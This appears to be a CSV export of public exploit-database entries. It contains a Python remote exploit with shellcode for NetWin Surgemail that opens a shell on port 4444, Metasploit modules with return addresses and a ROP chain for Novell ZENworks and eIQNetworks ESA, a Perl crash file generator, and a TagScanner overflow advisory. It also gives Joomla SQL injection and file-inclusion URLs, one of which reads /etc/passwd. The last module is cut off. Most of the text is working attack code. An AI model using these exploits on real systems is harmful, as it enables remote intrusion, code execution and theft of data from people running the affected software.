5259,"NetWin Surgemail 3.8k4-4 - IMAP (Authenticated) Remote LIST Universal #!/usr/bin/python ############################################################################### # # NetWin Surgemail 0DAY (IMAP POST AUTH) Remote LIST Universal Exploit  # Discovered and coded by Matteo Memelli aka ryujin  # http://www.gray-world.net http://www.be4mind.com # # Affected Versions : Version 3.8k4-4 Windows Platform # Tested on OS      : Windows 2000 SP4 English #                     Windows XP Sp2 English #                     Windows 2003 Standard Edition Italian # Discovery Date    : 03/13/2008 # #----------------------------------------------------------------------------- # # Thx to muts _[at]_ offensive-security.com  # for the ""Partial Overwrite"" Suggestion  :)  Now I know it works! # #----------------------------------------------------------------------------- ############################################################################## # # matte@badrobot:~/surgemail$ ./surgemail_list.py -H 192.168.1.245 -P 143 -l \ # test -p test # # [*********************************************************************] # [*                                                                   *] # [*    NetWin Surgemail 0DAY (IMAP POST AUTH) Remote LIST Exploit     *] # [*                      Discovered and Coded By                      *] # [*                          Matteo Memelli                           *] # [*                             (ryujin)                              *] # [*              www.be4mind.com - www.gray-world.net                 *] # [*                                                                   *] # [*********************************************************************] # [+] Connecting to imap server... # * OK IMAP ryujin (Version 3.8k4-4) # # [+] Logging in... # 0001 OK  LOGIN completed # # [+] PWNING IN PROGRESS  :)  ... # [+] DONE! Check your shell on 192.168.1.245:4444 # matte@badrobot:~/surgemail$ nc 192.168.1.245 4444 # Microsoft Windows XP [Version 5.1.2600] # (C) Copyright 1985-2001 Microsoft Corp. # # c:\surgemail>ipconfig # ipconfig # # Windows IP Configuration # # # Ethernet adapter Local Area Connection: # #        Connection-specific DNS Suffix  . :  #        IP Address. . . . . . . . . . . . : 192.168.1.245 #        Subnet Mask . . . . . . . . . . . : 255.255.255.0 #        Default Gateway . . . . . . . . . : 192.168.1.197 # # c:\surgemail> # ##############################################################################  from socket import * from optparse import OptionParser import sys, time  print ""[*********************************************************************]"" print ""[*                                                                   *]"" print ""[*    NetWin Surgemail 0DAY (IMAP POST AUTH) Remote LIST Exploit     *]"" print ""[*                      Discovered and Coded By                      *]"" print ""[*                          Matteo Memelli                           *]""  print ""[*                             (ryujin)                              *]""  print ""[*              www.be4mind.com - www.gray-world.net                 *]"" print ""[*                                                                   *]"" print ""[*********************************************************************]"" usage =  ""%prog -H TARGET_HOST -P TARGET_PORT -l USER -p PASSWD"" parser = OptionParser(usage=usage) parser.add_option(""-H"", ""--target_host"", type=""string"",                   action=""store"", dest=""HOST"",                   help=""Target Host"") parser.add_option(""-P"", ""--target_port"", type=""int"",                   action=""store"", dest=""PORT"",                   help=""Target Port"") parser.add_option(""-l"", ""--login-user"", type=""string"",                   action=""store"", dest=""USER"",                   help=""User login"") parser.add_option(""-p"", ""--login-password"", type=""string"",                   action=""store"", dest=""PASSWD"",                   help=""User password"") (options, args) = parser.parse_args() HOST    = options.HOST PORT    = options.PORT USER    = options.USER PASSWD  = options.PASSWD if not (HOST and PORT and USER and PASSWD):    parser.print_help()    sys.exit()  NOPES     = ""\x90""*9654 SJUMP     = ""\xEB\xF9\x90\x90""     # Jmp Back NJUMP     = ""\xE9\xDD\xD7\xFF\xFF"" # And Back Again Baby  ;)  # Partial Overwrite: 0x00 not allowed in buffer and all poppopret # begin with 0x00 in surgemail.exe  RET       = ""\x7e\x51\x78""          SHELLCODE = ( #[*] x86/alpha_mixed succeeded, final size 697 ""\x89\xe0\xd9\xeb\xd9\x70\xf4\x59\x49\x49\x49\x49\x49\x49\x49"" ""\x49\x49\x49\x49\x43\x43\x43\x43\x43\x43\x37\x51\x5a\x6a\x41"" ""\x58\x50\x30\x41\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42"" ""\x42\x30\x42\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b"" ""\x4c\x43\x5a\x4a\x4b\x50\x4d\x4d\x38\x4b\x49\x4b\x4f\x4b\x4f"" ""\x4b\x4f\x43\x50\x4c\x4b\x42\x4c\x47\x54\x46\x44\x4c\x4b\x50"" ""\x45\x47\x4c\x4c\x4b\x43\x4c\x44\x45\x44\x38\x45\x51\x4a\x4f"" ""\x4c\x4b\x50\x4f\x42\x38\x4c\x4b\x51\x4f\x51\x30\x43\x31\x4a"" ""\x4b\x50\x49\x4c\x4b\x46\x54\x4c\x4b\x45\x51\x4a\x4e\x50\x31"" ""\x49\x50\x4c\x59\x4e\x4c\x4b\x34\x49\x50\x42\x54\x44\x47\x49"" ""\x51\x48\x4a\x44\x4d\x43\x31\x49\x52\x4a\x4b\x4b\x44\x47\x4b"" ""\x50\x54\x51\x34\x47\x58\x44\x35\x4a\x45\x4c\x4b\x51\x4f\x46"" ""\x44\x45\x51\x4a\x4b\x45\x36\x4c\x4b\x44\x4c\x50\x4b\x4c\x4b"" ""\x51\x4f\x45\x4c\x45\x51\x4a\x4b\x43\x33\x46\x4c\x4c\x4b\x4b"" ""\x39\x42\x4c\x51\x34\x45\x4c\x43\x51\x48\x43\x46\x51\x49\x4b"" ""\x43\x54\x4c\x4b\x51\x53\x50\x30\x4c\x4b\x51\x50\x44\x4c\x4c"" ""\x4b\x44\x30\x45\x4c\x4e\x4d\x4c\x4b\x51\x50\x45\x58\x51\x4e"" ""\x43\x58\x4c\x4e\x50\x4e\x44\x4e\x4a\x4c\x46\x30\x4b\x4f\x4e"" ""\x36\x42\x46\x46\x33\x43\x56\x42\x48\x47\x43\x46\x52\x45\x38"" ""\x44\x37\x44\x33\x46\x52\x51\x4f\x46\x34\x4b\x4f\x4e\x30\x45"" ""\x38\x48\x4b\x4a\x4d\x4b\x4c\x47\x4b\x50\x50\x4b\x4f\x48\x56"" ""\x51\x4f\x4d\x59\x4d\x35\x43\x56\x4b\x31\x4a\x4d\x45\x58\x45"" ""\x52\x46\x35\x43\x5a\x44\x42\x4b\x4f\x4e\x30\x45\x38\x48\x59"" ""\x45\x59\x4a\x55\x4e\x4d\x46\x37\x4b\x4f\x49\x46\x51\x43\x46"" ""\x33\x50\x53\x51\x43\x51\x43\x50\x43\x50\x53\x47\x33\x46\x33"" ""\x4b\x4f\x48\x50\x45\x36\x45\x38\x42\x31\x51\x4c\x43\x56\x51"" ""\x43\x4d\x59\x4d\x31\x4a\x35\x45\x38\x4e\x44\x45\x4a\x42\x50"" ""\x48\x47\x46\x37\x4b\x4f\x49\x46\x43\x5a\x42\x30\x46\x31\x46"" ""\x35\x4b\x4f\x4e\x30\x43\x58\x49\x34\x4e\x4d\x46\x4e\x4b\x59"" ""\x46\x37\x4b\x4f\x48\x56\x50\x53\x51\x45\x4b\x4f\x4e\x30\x43"" ""\x58\x4b\x55\x50\x49\x4b\x36\x47\x39\x51\x47\x4b\x4f\x48\x56"" ""\x46\x30\x50\x54\x46\x34\x46\x35\x4b\x4f\x4e\x30\x4d\x43\x45"" ""\x38\x4a\x47\x42\x59\x48\x46\x44\x39\x50\x57\x4b\x4f\x4e\x36"" ""\x50\x55\x4b\x4f\x4e\x30\x43\x56\x42\x4a\x42\x44\x45\x36\x45"" ""\x38\x45\x33\x42\x4d\x4b\x39\x4d\x35\x43\x5a\x50\x50\x46\x39"" ""\x51\x39\x48\x4c\x4c\x49\x4d\x37\x42\x4a\x51\x54\x4b\x39\x4d"" ""\x32\x50\x31\x49\x50\x4a\x53\x4e\x4a\x4b\x4e\x47\x32\x46\x4d"" ""\x4b\x4e\x47\x32\x46\x4c\x4d\x43\x4c\x4d\x43\x4a\x46\x58\x4e"" ""\x4b\x4e\x4b\x4e\x4b\x45\x38\x42\x52\x4b\x4e\x48\x33\x42\x36"" ""\x4b\x4f\x43\x45\x47\x34\x4b\x4f\x48\x56\x51\x4b\x50\x57\x51"" ""\x42\x50\x51\x46\x31\x46\x31\x42\x4a\x43\x31\x46\x31\x50\x51"" ""\x51\x45\x46\x31\x4b\x4f\x48\x50\x43\x58\x4e\x4d\x4e\x39\x43"" ""\x35\x48\x4e\x50\x53\x4b\x4f\x4e\x36\x42\x4a\x4b\x4f\x4b\x4f"" ""\x50\x37\x4b\x4f\x4e\x30\x4c\x4b\x51\x47\x4b\x4c\x4c\x43\x49"" ""\x54\x45\x34\x4b\x4f\x49\x46\x51\x42\x4b\x4f\x48\x50\x45\x38"" ""\x4a\x4f\x48\x4e\x4d\x30\x45\x30\x51\x43\x4b\x4f\x49\x46\x4b"" ""\x4f\x4e\x30\x44\x4a\x41\x41"")  s = socket(AF_INET, SOCK_STREAM) print "" [+] Connecting to imap server..."" s.connect((HOST, PORT)) print s.recv(1024) print "" [+] Logging in..."" s.send(""0001 LOGIN %s %s\r\n"" % (USER, PASSWD)) print s.recv(1024) print "" [+] PWNING IN PROGRESS  :)  ..."" EVIL = NOPES + SHELLCODE + NJUMP + SJUMP + RET s.send('0002 LIST () ""/' + EVIL + '"" ""PWNED""\r\n') print "" [+] DONE! Check your shell on %s:%d"" % (HOST, 4444) s.close()  # milw0rm.com [2008-03-14]",NetWin Surgemail,1
9668,"Batch Picture Watemark 1.0 - '.jpg' Local Crash (PoC) """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""" """"""  :::::: ::   ::       ::        ::  ::  ::::        """""" """"""  ::      :: ::        :: :::::: .. ::::   ::        """""" """"""  :::::    :::   ::::: :: ::  :: ::  ::  ::::        """""" """"""  ::      :: ::  ::  : :: ::  :: ::  ::    ::        """""" """"""  :::::: ::   :: ::::: :: :::::: ::  ::  :::: rs.ir  """""" """"""                 ::                                  """""" """"""                                                     """""" """"""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""    Anti-Security Research Team & Security Institute  #[+] Bug : Batch Picture Watemark v1.0 (.jpg File) Crash Vulnerability Exploit #[+] program  Download : http://www.fototagger.com/download.php?product=latest #[+] Author : the_Edit0r #[+] Contact me : the_3dit0r[at]Yahoo[dot]coM #[+] Greetz to all my friends #[+] Tested on: Windows XP Pro SP2  #[+] web site: Expl0iters.ir  * Anti-security.ir #[+] Big thnx: H4ckcity Member   # Part Description : -------------------- Description Program   Batch Picture Protector is a powerful and easy-to-use batch image watermarking tool. It protects your digital images and artwork by adding professional transparent watermarks that combine text, illustrations and graphics. When used in conjunction with your favorite image editing software, a watermark can even contain your copyright, website url or logo image. Batch Picture Protector is the best way to achieve faster and simpler image protection. This watermarking software is particularly useful to designers, artists and banner makers who send artwork proofs to customers for evaluation. Those who publish images on internet web galleries can also protect image copyright using this watermarking software. By using the software, digital photos can be effectively protected from unauthorized use. This photo watermark software places permanent watermarks that cannot be removed.Batch Picture Protector is compatible with all major image formats, including JPEG, BMP, TIFF, GIF, PNG, PCX, and TGA. After adding a watermark, the image can be saved as a new file either in the same format or an alternative format. A built-in watermark file manager assists with the management of multiple watermarks for different purposes. You can save your favorite watermarks into the watermark library and reuse them whenever required. You can also create wide customizable multiple watermarks of any complexity. Key features:Transparent watermarks with fully customizable text and graphics Batch image processing including recursive file processing Easy-to-use and user-friendly Mouse-operated addition of visual watermarks Automatic watermark positioning Adjustable transparency setting Watermark text inclusive of macros (current date, time, file name, etc) Versatility allowing load/save of several watermarks Works with all major image formats Windows Vista compliant   For More Explaination look at follow pictures.  I. Clicking On File Perl http://expl0iters.ir/img/BPW1.jpg  II.Edit0r.jpg File Created Successfully http://expl0iters.ir/img/BPW2.jpg  III.Run the Program Batch Picture Watemark & add Files ( include Edit0r.jpg File )  http://expl0iters.ir/img/BPW3.jpg http://expl0iters.ir/img/BPW4.jpg  IV.Boom ...!!! Crash Program   # Part Expl0it & Bug Codes ( Poc ) :  ------------------------------------ #!/usr/bin/perl my $crash=""\x41"" x 15000 ; Random  open(myfile,'>>Edit0r.jpg');  print myfile $crash; print ""File Created successfully\n"";  # milw0rm.com [2009-09-14]",Batch Picture Protector,1
24741,"TagScanner 5.1 - Stack Buffer Overflow (PoC) Title: ====== TagScanner v5.1 - Stack Buffer Overflow Vulnerability   Date: ===== 2013-01-22   References: =========== http://www.vulnerability-lab.com/get_content.php?id=831   VL-ID: ===== 831   Introduction: ============= TagScanner is a multifunction program for organizing and managing your music collection. It can edit tags of mostly state-of-the-art  audio formats, rename files based on the tag information, generate tag information from filenames, and perform any transformations of  the text from tags and filenames. Also you may get album info via online databases like freedb or Amazon. Supports ID3v1, ID3v2,  Vorbis comments, APEv2, WindowsMedia and MP4(iTunes) tags.  - Rename files based on the tag and file information - Powerful multiple files tag editor - Import tag information and album art from online databases like freedb or Amazon - Generate tag information from file/foldernames - Tag fields formatting and rearrangement - Words replacement and case conversion from tags and filenames - Supports MP3, OGG, FLAC, WMA, MPEG-4, Opus, Musepack, Monkey`s Audio, AAC, OptimFROG, SPEEX, WavPack, TrueAudio files - Supports ID3 1.0/1.1/2.2/2.3/2.4 tags, APE v1 and v2 tags, Vorbis Comments, WMA tags and MP4(iTunes) metadata - Supports for embedded lyrics and cover art - Resize cover art for portable devices on the fly - TAGs versions conversions - Quick playlists creation - Export information to HTML, XML CSV or any user-defined format - Full support for Unicode - Multilanguage interface - Built-in multiformat player  Powerful TAG editor with batch functions and special features. Playlist maker with ability to export playlists to HTML or Excel.  Easy-to-use interface. Built-in player.  (Copy of the Vendor Homepage: http://www.xdlab.ru/ )   Abstract: ========= The Vulnerability Laboratory Research Team discovered a local stack buffer overflow vulnerability in the Yandex xdLab TagScanner v5.1 software.   Report-Timeline: ================ 2013-01-22:	Public Disclosure   Status: ======== Published   Affected Products: ================== Yandex - XDLab Product: TagScanner 5.1   Exploitation-Technique: ======================= Local   Severity: ========= High   Details: ======== A local stack buffer overflow vulnerability is detected in the official Yandex xdLab TagScanner v5.1 software.  The buffer overflow occurs when data written to a buffer, due to insufficient bounds checking, corrupts data values  in memory addresses adjacent to the allocated buffer.  The vulnerability is located in the `rename` module of the software when processing to load the `rename folder by tag`  function as listing. Local attackers can use the `Edit template` function of the rename module to overflow the memory  when processing to (buffer) list the inserted context (large). When the victim is processing to click with another system  user account the syncronized software context and clicks on the rename function for the tag listing the overflow occurs. The vulnerable add input parameters to exploit the local vulnerability are `Custom Genres` & `Templates for Foldernames`.  The vulnerability can be exploited by privileged system user accounts with low or medium required user interaction. Successful exploitation of the buffer overflow vulnerability results in overruns of the buffer(s) boundary and overwrites adjacent memory.  Vulnerable Module(s): 				[+] Rename Folder by TAG - Genres and Templates  Vulnerable Parameter(s): 				[+] Custom Genres - Add 				[+] Templates for Folderanmes - Add  Affected Module(s): 				[+] Rename Folder by TAG - TAG Listing (Component)   Proof of Concept: ================= The vulnerability can be exploited by local attackers with privileged system user account and medium required user interaction. For demonstration or reproduce ...  Manually steps to reproduce ...  1.   Download the TagScanner v5.1 software of the yandex dxlab 2.   Start the software and include any random track from your hd to the main listing 3.   Click (Right) with the mouse on the listed track and open the rename folder by tag main function 4.   Click  ... > Edit templates 5.   Open the Genres and Templates section in the module 6.   Now choose one of the add function and click on + (Custom Genres or Templates for Foldernames) 7.   Start your fuzzer to process the request or include manually a large string (x bytes) since the block is empty 8.   Save it by opening the big black arrow (Left|Top) in the menu 9.   Choose the track by an easy click, click with right mouse button again and open the rename folder by tag listing 10. The software will crash the and the overflow with the ability to overwrite occurs   --- Debug Logs (Exception) ---  (13e8.11dc): AV - code c0000005 (first chance) eax=00000000 ebx=00000000 ecx=00410041 edx=779cb46d esi=00000000 edi=00000000 eip=41414141 esp=0018ea90 ebp=0018eab0 iopl=0         nv up ei pl zr na pe nc cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010246 Tagscan+0x10041: 41414141 0000            add     byte ptr [eax],al          ds:002b:00000000=?? 0:000> !exchain 0018eaa4: ntdll!LdrRemoveLoadAsDataTable+d64 (779cb46d) 0018eed0: Tagscan+14420 (00414420) 0018eef0: Tagscan+1ead78 (005ead78) 0018f154: Tagscan+10041 (41414141) Invalid exception stack at 41414141 0:000> u Tagscan+0x10041: 41414141 0000            add     byte ptr [eax],al 00410043 00ac0041000000  add     byte ptr [eax+eax+41h],ch 0041004a 0000            add     byte ptr [eax],al 0041004c 0000            add     byte ptr [eax],al 0041004e 0000            add     byte ptr [eax],al 00410050 0000            add     byte ptr [eax],al 00410052 0000            add     byte ptr [eax],al 00410054 94              xchg    eax,esp 0:000> a 41414141  --- APPCrash Logs --- EventType=APPCRASH (BEX) EventTime=130029411726060019 ReportType=2 Consent=1 ReportIdentifier=ddec5c9b-6102-11e2-adfe-efaefe8363dd IntegratorReportIdentifier=ddec5c9a-6102-11e2-adfe-efaefe8363dd WOW64=1 Response.type=4 Sig[0].Name=Anwendungsname Sig[0].Value=Tagscan.exe Sig[1].Name=Anwendungsversion Sig[1].Value=5.1.6.30 Sig[2].Name=Anwendungszeitstempel Sig[2].Value=50f57b7e Sig[3].Name=Fehlermodulname Sig[3].Value=Tagscan.exe Sig[4].Name=Fehlermodulversion Sig[4].Value=5.1.6.30 Sig[5].Name=Fehlermodulzeitstempel Sig[5].Value=50f57b7e Sig[6].Name=Ausnahmecode Sig[6].Value=c0000005 Sig[7].Name=Ausnahmeoffset Sig[7].Value=41414141 DynamicSig[1].Name=Betriebsystemversion DynamicSig[1].Value=6.1.7601.2.1.0.768.3 DynamicSig[2].Name=Gebietsschema-ID DynamicSig[2].Value=1031 DynamicSig[22].Name=Zusatzinformation 1 DynamicSig[22].Value=c9ed DynamicSig[23].Name=Zusatzinformation 2 DynamicSig[23].Value=c9ed9ec450d4be6144400a9541f5eddb DynamicSig[24].Name=Zusatzinformation 3 DynamicSig[24].Value=04ae DynamicSig[25].Name=Zusatzinformation 4 DynamicSig[25].Value=04ae339f4a83b6a3d3bf04a428f6874f UI[2]=C:\Program Files (x86)\TagScanner\Tagscan.exe UI[3]=Ultimate TagScanner funktioniert nicht mehr UI[4]=Windows kann online nach einer L�sung f�r das Problem suchen. UI[5]=Online nach einer L�sung suchen und das Programm schlie�en UI[6]=Sp�ter online nach einer L�sung suchen und das Programm schlie�en UI[7]=Programm schlie�en LoadedModule[0]=C:\Program Files (x86)\TagScanner\Tagscan.exe LoadedModule[62]=C:\Program Files (x86)\TagScanner\plugins\bass_aac.dll LoadedModule[63]=C:\Program Files (x86)\TagScanner\plugins\bass_alac.dll LoadedModule[64]=C:\Program Files (x86)\TagScanner\plugins\bass_ape.dll LoadedModule[65]=C:\Program Files (x86)\TagScanner\plugins\bass_mpc.dll LoadedModule[66]=C:\Program Files (x86)\TagScanner\plugins\bass_ofr.dll LoadedModule[67]=C:\Program Files (x86)\TagScanner\OptimFROG.dll LoadedModule[68]=C:\Program Files (x86)\TagScanner\plugins\bass_spx.dll LoadedModule[69]=C:\Program Files (x86)\TagScanner\plugins\bass_tta.dll LoadedModule[70]=C:\Program Files (x86)\TagScanner\plugins\bass_wv.dll LoadedModule[71]=C:\Program Files (x86)\TagScanner\plugins\bassflac.dll LoadedModule[72]=C:\Program Files (x86)\TagScanner\plugins\basswma.dll LoadedModule[73]=C:\Program Files (x86)\TagScanner\plugins\bassopus.dll LoadedModule[74]=C:\Windows\system32\mswsock.dll LoadedModule[75]=C:\Windows\System32\wshtcpip.dll LoadedModule[76]=C:\Windows\system32\DNSAPI.dll LoadedModule[77]=C:\Program Files (x86)\Bonjour\mdnsNSP.dll LoadedModule[78]=C:\Windows\system32\Iphlpapi.DLL LoadedModule[79]=C:\Windows\system32\WINNSI.DLL LoadedModule[80]=C:\Windows\system32\rasadhlp.dll LoadedModule[81]=C:\Windows\System32\wship6.dll LoadedModule[82]=C:\Windows\system32\avrt.dll FriendlyEventName=Nicht mehr funktionsf�hig ConsentKey=APPCRASH AppName=Ultimate TagScanner AppPath=C:\Program Files (x86)\TagScanner\Tagscan.exe   Solution: ========= The vulnerability can be patched by a restriction of the input fields when processing to load the rename folder by tag listing.    Risk: ===== The security risk of the local buffer overflow vulnerability is estimated as high(-).   Credits: ======== Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (bkm@vulnerability-lab.com)   Disclaimer: =========== The information provided in this advisory is provided as it is without any warranty. Vulnerability-Lab disclaims all warranties,  either expressed or implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability- Lab or its suppliers are not liable in any case of damage, including direct, indirect, incidental, consequential loss of business  profits or special damages, even if Vulnerability-Lab or its suppliers have been advised of the possibility of such damages. Some  states do not allow the exclusion or limitation of liability for consequential or incidental damages so the foregoing limitation  may not apply. We do not approve or encourage anybody to break any vendor licenses, policies, deface websites, hack into databases  or trade with fraud/stolen material.  Domains:    www.vulnerability-lab.com   	- www.vuln-lab.com			       - www.vulnerability-lab.com/register Contact:    admin@vulnerability-lab.com 	- support@vulnerability-lab.com 	       - research@vulnerability-lab.com Section:    video.vulnerability-lab.com 	- forum.vulnerability-lab.com 		       - news.vulnerability-lab.com Social:	    twitter.com/#!/vuln_lab 		- facebook.com/VulnerabilityLab 	       - youtube.com/user/vulnerability0lab Feeds:	    vulnerability-lab.com/rss/rss.php	- vulnerability-lab.com/rss/rss_upcoming.php   - vulnerability-lab.com/rss/rss_news.php  Any modified copy or reproduction, including partially usages, of this file requires authorization from Vulnerability Laboratory.  Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other  media, are reserved by Vulnerability-Lab Research Team or its suppliers. All pictures, texts, advisories, sourcecode, videos and  other information on this website is trademark of vulnerability-lab team & the specific authors or managers. To record, list (feed),  modify, use or edit our material contact (admin@vulnerability-lab.com or support@vulnerability-lab.com) to get a permission.      				   	Copyright � 2013 | Vulnerability Laboratory  --  VULNERABILITY RESEARCH LABORATORY LABORATORY RESEARCH TEAM CONTACT: research@vulnerability-lab.com",TagScanner,1
19932,"Novell ZENworks Configuration Management Preboot Service 0x21 - Remote Buffer Overflow (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = NormalRanking  	include Msf::Exploit::Remote::Tcp 	include Msf::Exploit::Remote::Seh  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'Novell ZENworks Configuration Management Preboot Service 0x21 Buffer Overflow', 			'Description'    => %q{ 					This module exploits a remote buffer overflow in the ZENworks Configuration 				Management 10 SP2. The vulnerability exists in the Preboot service and can be 				triggered by sending a specially crafted packet with the opcode 0x21 				(PROXY_CMD_FTP_FILE) to port 998/TCP. The module has been successfully tested on 				Novell ZENworks Configuration Management 10 SP2 and Windows Server 2003 SP2 				(DEP bypass). 			}, 			'License'        => MSF_LICENSE, 			'Author'         => 				[ 					'Stephen Fewer', # Vulnerability Discovery 					'juan' # Metasploit module 				], 			'References'     => 				[ 					[ 'OSVDB', '65361' ], 					[ 'BID', '40486' ], 					[ 'URL', 'http://www.zerodayinitiative.com/advisories/ZDI-10-090/' ], 					[ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7005572' ] 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'process' 				}, 			'Payload'        => 				{ 					'BadChars' => """", 					'Space'=> 8138, 					'DisableNops' => true, 					'PrependEncoder' => ""\x81\xC4\x54\xF2\xFF\xFF"" # add esp, -3500 				}, 			'Platform'       => ['win'], 			'Targets'        => 				[ 					[ 'Novell ZENworks Configuration Management 10 SP2 / Windows 2003 SP2', 						{ 							'Offset'            => 8252, 							'OffsetBottomStack' => 8288, 							'OffsetRop'         => 44, 							'Ret'               => 0x0040175a # add esp, 0x408 # ret - novell_pbserv.exe 						} 					] 				], 			'Privileged'     => false, 			'DisclosureDate' => 'Mar 30 2010', 			'DefaultTarget'  => 0))  		register_options([Opt::RPORT(998)], self.class) 	end  	def junk(n=4) 		return rand_text_alpha(n).unpack(""V"").first 	end  	def nop 		return make_nops(4).unpack(""L"")[0].to_i 	end  	# rop chain generated with mona.py 	def create_rop_chain() 		rop_gadgets = 			[ 				0x100065d1, # POP EDX # MOV ESI,C4830005 # ADD AL,3B # RETN [zenimgweb.dll] 				0x00001000, # 0x00001000-> edx 				0x10062113, # POP ECX # RETN [zenimgweb.dll] 				0x1007d158, # ptr to &VirtualAlloc() [IAT zenimgweb.dll] 				0x10018553, # MOV EAX,DWORD PTR DS:[ECX] # ADD ESP,20 # RETN [zenimgweb.dll] 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				junk,       # Filler (compensate) 				0x10016818, # PUSH EAX # POP ESI # RETN [zenimgweb.dll] 				0x1002fd05, # POP EBP # RETN [zenimgweb.dll] 				0x10043053, # & push esp #  ret  [zenimgweb.dll] 				0x1003cbf8, # POP EBX # RETN [zenimgweb.dll] 				0x00000001, # 0x00000001-> ebx 				0x00423eeb, # POP ECX # RETN [novell-pbserv.exe] 				0x00000040, # 0x00000040-> ecx 				0x1003173e, # POP EDI # RETN [zenimgweb.dll] 				0x10020801, # RETN (ROP NOP) [zenimgweb.dll] 				0x00406b58, # POP EAX # RETN [novell-pbserv.exe] 				nop, 				0x1006d1e6, # PUSHAD # RETN [zenimgweb.dll] 		].pack(""V*"")  		return rop_gadgets 	end   	def exploit 		connect  		buf = rand_text(target['OffsetRop']) 		buf << create_rop_chain 		buf << payload.encoded 		buf << rand_text(target['Offset'] - buf.length) 		buf << generate_seh_record(target.ret) 		buf << rand_text(target['OffsetBottomStack'] - buf.length)  		packet =  [0x21].pack(""N"") # Opcode 0x21 PROXY_CMD_FTP_FILE 		packet << [buf.length].pack(""N"") # Length 		packet << buf # Value 		sock.put(packet)  		disconnect 	end end",Novell ZENworks Configuration Management Preboot Service,1
41399,"Joomla! Component MaQma Helpdesk 4.2.7 - 'id' SQL Injection # # # # #  # Exploit Title: Joomla! Component MaQma Helpdesk v4.2.7 - SQL Injection # Google Dork: inurl:index.php?option=com_maqmahelpdesk # Date: 20.02.2017 # Vendor Homepage: http://componentslab.com/ # Software Buy: https://extensions.joomla.org/extensions/extension/clients-a-communities/help-desk/maqma-helpdesk/ # Demo: http://demo.componentslab.com/index.php/department/software-support # Version: 4.2.7 # Tested on: Win7 x64, Kali Linux x64 # # # # #  # Exploit Author: Ihsan Sencan # Author Web: http://ihsan.net # Author Mail : ihsan[@]ihsan[.]net # # # # # # SQL Injection/Exploit : # http://localhost/[PATH]/index.php?option=com_maqmahelpdesk&task=pdf_kb&id=[SQL] # # # # #",Joomla! Component MaQma Helpdesk,1
12175,"Joomla! Component JoomMail 1.0 - Local File Inclusion ==============================================================================================================     [o] Joomla Component JoomMail Local File Inclusion Vulnerability          Software : com_joommail version 1.0        Author   : AntiSecurity [ Vrs-hCk NoGe OoN_BoY Paman zxvf s4va ]        Contact  : public[at]antisecurity[dot]org        Home     : http://antisecurity.org/   ==============================================================================================================     [o] Exploit         http://localhost/[path]/index.php?option=com_joommail&controller=[LFI]     [o] PoC         http://localhost/index.php?option=com_joommail&controller=../../../../../../../../../../etc/passwd%00   ==============================================================================================================     [o] Greetz         Angela Zhang stardustmemory aJe martfella pizzyroot Genex        H312Y yooogy mousekill }^-^{ noname matthews s4va wishnusakti        skulmatic OLiBekaS ulga Cungkee k1tk4t str0ke kaka11   ==============================================================================================================     [o] April 12 2010 - GMT +07:00 Jakarta, Indonesia",Joomla! Component JoomMail,1
16451,"eIQNetworks ESA - License Manager LICMGR_ADDLICENSE Overflow (Metasploit) ## # $Id: eiqnetworks_esa.rb 10394 2010-09-20 08:06:27Z jduck $ ##  ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # Framework web site for more information on licensing and terms of use. # http://metasploit.com/framework/ ##  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote 	Rank = AverageRanking  	include Msf::Exploit::Remote::Tcp  	def initialize(info = {}) 		super(update_info(info, 			'Name'           => 'eIQNetworks ESA License Manager LICMGR_ADDLICENSE Overflow', 			'Description'    => %q{ 					This module exploits a stack buffer overflow in eIQnetworks 				Enterprise Security Analyzer. During the processing of 				long arguments to the LICMGR_ADDLICENSE command, a stack-based 				buffer overflow occurs. This module has only been tested 				against ESA v2.1.13. 			}, 			'Author'         => [ 'MC', 'ri0t <ri0t[at]ri0tnet.net>',  'kf' ], 			'Version'        => '$Revision: 10394 $', 			'References'     => 				[ 					['CVE', '2006-3838'], 					['OSVDB', '27526'], 					['BID', '19163'], 					['URL', 'http://www.zerodayinitiative.com/advisories/ZDI-06-024.html'], 				], 			'DefaultOptions' => 				{ 					'EXITFUNC' => 'seh', 				}, 			'Payload'        => 				{ 					'Space'    => 400, 					'BadChars' => ""\x00"", 					'PrependEncoder' => ""\x81\xc4\xff\xef\xff\xff\x44"", 				}, 			'Platform'       => 'win', 			'Targets'        => 				[ 					['EnterpriseSecurityAnalyzerv21 Universal', { 'Ret' => 0x00448187, 'Offset' => 494 } ],  					['EiQ Enterprise Security Analyzer Offset 494 Windows 2000 SP0-SP4 English',    { 'Ret' =>  0x750316e2, 'Offset' => 494 } ],   # call ebx 					['EiQ Enterprise Security Analyzer Offset 494 Windows XP English SP1/SP2',      { 'Ret' =>  0x77db64dc, 'Offset' => 494 } ],	# jmp ebx 					['EiQ Enterprise Security Analyzer Offset 494 Windows Server 2003 SP0/SP1',     { 'Ret' =>  0x77d16764, 'Offset' => 494 } ],   # jmp EBX 					['Astaro Report Manager (OEM) Offset 1262 Windows 2000 SP0-SP4 English',        { 'Ret' =>  0x750316e2, 'Offset' => 1262 } ], 					['Astaro Report Manager (OEM) Offset 1262 Windows XP English SP1/SP2',          { 'Ret' =>  0x77db64dc, 'Offset' => 1262 } ], 					['Astaro Report Manager (OEM) Offset 1262 Windows Server 2003 English SP0/SP1', { 'Ret' =>  0x77d16764, 'Offset' => 1262 } ], 					['Fortinet FortiReporter (OEM) Offset 1262 Windows 2000 